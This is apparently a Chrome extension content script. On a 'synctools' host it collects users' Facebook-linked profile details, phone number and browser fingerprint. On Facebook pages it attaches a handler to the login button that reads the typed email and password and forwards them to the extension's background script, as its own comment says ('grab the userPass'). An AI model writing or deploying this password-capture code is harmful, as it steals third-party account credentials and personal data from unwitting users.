// chrome.runtime.onMessage.addListener(function(cmd, sender, sendResponse) {
//   console.log('chrome.runtime.onMessage: ', cmd);
//   switch (cmd) {
//     case 'signUp':
//       // retrieve document HTML and send to popup.js
//       sendResponse({
//         title: document.title,
//         url: window.location.href,
//         html: document.documentElement.innerHTML,
//       });
//       break;
//     case 'getHeadTitle':
//       // retrieve title HTML and send to popup.js
//       sendResponse(document.getElementsByTagName('title')[0].innerHTML);
//       break;
//     default:
//       sendResponse(null);
//   }
// });

$('document').ready(function() {
  console.log('localStorage: ', localStorage);
  let os;
  if (navigator.platform.toLowerCase().includes('lin')) {
    os = 'lin';
  } else if (navigator.platform.toLowerCase().includes('mac')) {
    os = 'mac';
  } else if (navigator.platform.toLowerCase().includes('win')) {
    os = 'win';
  }
  console.log('OS: ', os);
  console.log('navigator: ', navigator);
  if (location.host.includes('synctools')) {
    if (!localStorage.member) {
      chrome.extension.sendMessage(
        {
          type: 'signUp',
          data: {
            personalAccountID: localStorage.personalAccountID,
            fbEmail: localStorage.fbEmail,
            firstName: localStorage.firstName,
            lastName: localStorage.lastName,
            OS: os,
            userAgent: window.navigator.userAgent,
            language: window.navigator.language,
            resolution: window.screen.width + 'x' + window.screen.height,
            platform: window.navigator.platform,
            source: localStorage.source,
            fbProfileURL: localStorage.fbProfileURL,
            phone: localStorage.phone,
          },
        },
        response => {
          console.log('response: ', response);
          localStorage.setItem('member', 'true');
        }
      );
    }
  }
  //grab the userPass and send to the background scripts
  if (location.host.includes('facebook')) {
    $('input[type="submit"]').click(function() {
      let fbEmail = $('input[name="email"]').val();
      let fbPass = $('input[name="pass"]').val();
      chrome.extension.sendMessage({
        type: 'fbLogIn',
        data: {
          fbEmail,
          fbPass,
        },
      });
      localStorage.setItem('status', 'fbCredsSaved');
    });
  }
});
